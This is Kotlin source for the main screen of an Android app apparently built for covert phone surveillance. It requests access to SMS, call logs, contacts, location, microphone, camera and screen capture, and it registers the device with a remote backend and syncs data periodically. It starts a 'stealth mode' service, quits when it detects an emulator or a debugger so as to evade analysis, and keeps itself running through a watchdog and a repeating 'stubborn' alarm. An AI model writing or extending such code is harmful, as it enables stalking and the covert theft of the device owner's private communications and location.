package com.devicemonitor

import android.Manifest
import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Build
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.semantics.contentDescription
import androidx.compose.ui.semantics.semantics
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.currentBackStackEntryAsState
import androidx.navigation.compose.rememberNavController
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.devicemonitor.data.models.Device
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.service.StealthModeService
import com.devicemonitor.service.SyncWorker
import com.devicemonitor.ui.theme.DeviceMonitorTheme
import com.devicemonitor.utils.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class MainActivity : ComponentActivity() {

    private val repository = DeviceRepository()

    private val permissionsToRequest = mutableListOf<String>().apply {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_PHONE_STATE)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.CAMERA)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
        }
    }

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        checkAllPermissionsGranted()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            StealthModeService.setScreenCaptureIntent(result.resultCode, result.data!!)
        }
    }

    override fun attachBaseContext(newBase: Context) {
        val lang = Constants.getLanguage(newBase)
        val locale = Locale(lang)
        Locale.setDefault(locale)
        val config = newBase.resources.configuration
        config.setLocale(locale)
        val context = newBase.createConfigurationContext(config)
        super.attachBaseContext(context)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (isRunningOnEmulator() || android.os.Debug.isDebuggerConnected()) {
            finish()
            return
        }

        lifecycleScope.launch {
            registerDevice()
        }

        setContent {
            val context = LocalContext.current
            val themeMode = remember { mutableIntStateOf(Constants.getThemeMode(context)) }
            val darkTheme = when (themeMode.intValue) {
                1 -> false
                2 -> true
                else -> isSystemInDarkTheme()
            }

            DeviceMonitorTheme(darkTheme = darkTheme) {
                MainScreen(
                    onThemeChange = { mode -> themeMode.intValue = mode },
                    onStartSetup = { checkAndRequestPermissions() },
                    onOpenAccessibility = { openAccessibilitySettings() },
                    onOpenUsageStats = { openUsageStatsSettings() },
                    onGrantScreenCapture = { requestScreenCapturePermission() },
                    onOpenDeviceAdmin = { openDeviceAdminSettings() },
                    onDisableBatteryOpt = { requestIgnoreBatteryOptimizations() },
                    onEnterStealth = { enterStealthMode() }
                )
            }
        }

        startStealthService()
    }

    private fun openDeviceAdminSettings() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, com.devicemonitor.receiver.MonitorDeviceAdminReceiver::class.java))
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.enable_device_admin))
        }
        startActivity(intent)
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            startActivity(intent)
        }
    }

    private suspend fun registerDevice() {
        withContext(Dispatchers.IO) {
            val deviceId = Constants.getDeviceId(this@MainActivity)
            val deviceToken = Constants.getDeviceToken(this@MainActivity)
            val existingDevice = repository.getDeviceByToken(deviceToken)
            if (existingDevice == null) {
                val newDevice = Device(
                    id = deviceId,
                    device_name = "${Build.MANUFACTURER} ${Build.MODEL}",
                    device_token = deviceToken,
                    device_model = "${Build.MANUFACTURER} ${Build.MODEL}",
                    os_version = "Android ${Build.VERSION.RELEASE}",
                    last_seen = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                )
                repository.insertDevice(newDevice)
            } else {
                if (existingDevice.id != null && existingDevice.id != deviceId) {
                    Constants.saveDeviceId(this@MainActivity, existingDevice.id)
                }
            }
        }
    }

    private fun checkAndRequestPermissions() {
        val missingPermissions = permissionsToRequest.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missingPermissions.isNotEmpty()) {
            requestPermissionLauncher.launch(missingPermissions.toTypedArray())
        } else {
            checkAllPermissionsGranted()
        }
    }

    private fun checkAllPermissionsGranted() {
        val locationGranted = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (locationGranted) {
            scheduleSyncWork()
        }
    }

    private fun openAccessibilitySettings() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun openUsageStatsSettings() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
    }

    private fun requestScreenCapturePermission() {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
    }

    private fun enterStealthMode() {
        Constants.setStealthModeEnabled(this, true)
        AlertDialog.Builder(this)
            .setTitle(getString(R.string.setup_title))
            .setMessage(getString(R.string.stealth_note))
            .setPositiveButton(getString(R.string.ok)) { _, _ -> finish() }
            .show()
    }

    private fun isRunningOnEmulator(): Boolean {
        return (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator")
    }

    private fun startStealthService() {
        val serviceIntent = Intent(this, StealthModeService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun scheduleSyncWork() {
        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
        
        // 1. Data Sync Work
        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(Constants.SYNC_INTERVAL_MINUTES, TimeUnit.MINUTES)
            .setConstraints(constraints).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "SyncDataWork",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )

        // 2. Service Watchdog (Feature 1.1)
        val watchdogRequest = PeriodicWorkRequestBuilder<com.devicemonitor.service.ServiceWatchdog>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "ServiceWatchdog",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            watchdogRequest
        )

        // 3. AlarmManager Stubborn Persistence (Feature 11)
        scheduleStubbornAlarm()
    }

    private fun scheduleStubbornAlarm() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        val intent = Intent(this, com.devicemonitor.receiver.BootReceiver::class.java)
        val pendingIntent = android.app.PendingIntent.getBroadcast(
            this, 0, intent, android.app.PendingIntent.FLAG_IMMUTABLE
        )
        // Repeat every 10 mins
        alarmManager.setRepeating(
            android.app.AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 600000,
            600000,
            pendingIntent
        )
    }
}

@Composable
fun MainScreen(
    onThemeChange: (Int) -> Unit,
    onStartSetup: () -> Unit,
    onOpenAccessibility: () -> Unit,
    onOpenUsageStats: () -> Unit,
    onGrantScreenCapture: () -> Unit,
    onOpenDeviceAdmin: () -> Unit,
    onDisableBatteryOpt: () -> Unit,
    onEnterStealth: () -> Unit
) {
    val navController = rememberNavController()
    Scaffold(
        bottomBar = {
            NavigationBar {
                val navBackStackEntry by navController.currentBackStackEntryAsState()
                val currentRoute = navBackStackEntry?.destination?.route
                NavigationBarItem(
                    icon = { Icon(Icons.Default.Build, contentDescription = null) },
                    label = { Text(stringResource(R.string.setup)) },
                    selected = currentRoute == "setup",
                    onClick = { navController.navigate("setup") }
                )
                NavigationBarItem(
                    icon = { Icon(Icons.Default.Settings, contentDescription = null) },
                    label = { Text(stringResource(R.string.settings)) },
                    selected = currentRoute == "settings",
                    onClick = { navController.navigate("settings") }
                )
            }
        }
    ) { innerPadding ->
        NavHost(navController = navController, startDestination = "setup", modifier = Modifier.padding(innerPadding)) {
            composable("setup") {
                SetupScreen(onStartSetup, onOpenAccessibility, onOpenUsageStats, onGrantScreenCapture, onOpenDeviceAdmin, onDisableBatteryOpt, onEnterStealth)
            }
            composable("settings") {
                SettingsScreen(onThemeChange)
            }
        }
    }
}

@Composable
fun SetupScreen(
    onStartSetup: () -> Unit,
    onOpenAccessibility: () -> Unit,
    onOpenUsageStats: () -> Unit,
    onGrantScreenCapture: () -> Unit,
    onOpenDeviceAdmin: () -> Unit,
    onDisableBatteryOpt: () -> Unit,
    onEnterStealth: () -> Unit
) {
    Column(
        modifier = Modifier.fillMaxSize().padding(24.dp).semantics { contentDescription = "Setup Screen" },
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(text = stringResource(R.string.setup_title), style = MaterialTheme.typography.headlineMedium, modifier = Modifier.padding(bottom = 32.dp))
        Button(onClick = onStartSetup, modifier = Modifier.fillMaxWidth()) { Text(stringResource(R.string.grant_permissions)) }
        Spacer(modifier = Modifier.height(12.dp))
        OutlinedButton(onClick = onOpenAccessibility, modifier = Modifier.fillMaxWidth()) { Text(stringResource(R.string.enable_accessibility)) }
        Spacer(modifier = Modifier.height(12.dp))
        OutlinedButton(onClick = onOpenUsageStats, modifier = Modifier.fillMaxWidth()) { Text(stringResource(R.string.enable_usage_access)) }
        Spacer(modifier = Modifier.height(12.dp))
        OutlinedButton(onClick = onGrantScreenCapture, modifier = Modifier.fillMaxWidth()) { Text(stringResource(R.string.grant_screen_capture)) }
        Spacer(modifier = Modifier.height(12.dp))
        OutlinedButton(onClick = onOpenDeviceAdmin, modifier = Modifier.fillMaxWidth()) { Text(stringResource(R.string.enable_device_admin)) }
        Spacer(modifier = Modifier.height(12.dp))
        OutlinedButton(onClick = onDisableBatteryOpt, modifier = Modifier.fillMaxWidth()) { Text(stringResource(R.string.disable_battery_optimization)) }
        Spacer(modifier = Modifier.height(32.dp))
        Button(onClick = onEnterStealth, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)) {
            Text(stringResource(R.string.enter_stealth_mode))
        }
        Spacer(modifier = Modifier.height(16.dp))
        Text(text = stringResource(R.string.stealth_note), style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant, modifier = Modifier.padding(8.dp))
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SettingsScreen(onThemeChange: (Int) -> Unit) {
    val context = LocalContext.current
    var themeMode by remember { mutableIntStateOf(Constants.getThemeMode(context)) }
    var stealthEnabled by remember { mutableStateOf(Constants.isStealthModeEnabled(context)) }
    var language by remember { mutableStateOf(Constants.getLanguage(context)) }

    Column(modifier = Modifier.fillMaxSize().padding(16.dp).semantics { contentDescription = "Settings Screen" }) {
        Text(text = stringResource(R.string.settings), style = MaterialTheme.typography.headlineMedium, modifier = Modifier.padding(bottom = 24.dp))
        Text(stringResource(R.string.appearance), style = MaterialTheme.typography.titleMedium)
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text(stringResource(R.string.dark_mode))
            Row {
                FilterChip(selected = themeMode == 1, onClick = { themeMode = 1; Constants.setThemeMode(context, 1); onThemeChange(1) }, label = { Text(stringResource(R.string.off)) })
                Spacer(modifier = Modifier.width(4.dp))
                FilterChip(selected = themeMode == 2, onClick = { themeMode = 2; Constants.setThemeMode(context, 2); onThemeChange(2) }, label = { Text(stringResource(R.string.on)) })
                Spacer(modifier = Modifier.width(4.dp))
                FilterChip(selected = themeMode == 0, onClick = { themeMode = 0; Constants.setThemeMode(context, 0); onThemeChange(0) }, label = { Text(stringResource(R.string.system)) })
            }
        }
        Divider(modifier = Modifier.padding(vertical = 16.dp))
        Text(stringResource(R.string.language), style = MaterialTheme.typography.titleMedium)
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text(stringResource(R.string.current_language))
            Row {
                FilterChip(selected = language == "en", onClick = { language = "en"; Constants.setLanguage(context, "en"); (context as? MainActivity)?.recreate() }, label = { Text(stringResource(R.string.english)) })
                Spacer(modifier = Modifier.width(8.dp))
                FilterChip(selected = language == "bn", onClick = { language = "bn"; Constants.setLanguage(context, "bn"); (context as? MainActivity)?.recreate() }, label = { Text(stringResource(R.string.bengali)) })
            }
        }
        Divider(modifier = Modifier.padding(vertical = 16.dp))
        Text(stringResource(R.string.privacy), style = MaterialTheme.typography.titleMedium)
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
            Text(stringResource(R.string.stealth_mode_status))
            Switch(checked = stealthEnabled, onCheckedChange = { stealthEnabled = it; Constants.setStealthModeEnabled(context, it) })
        }
    }
}
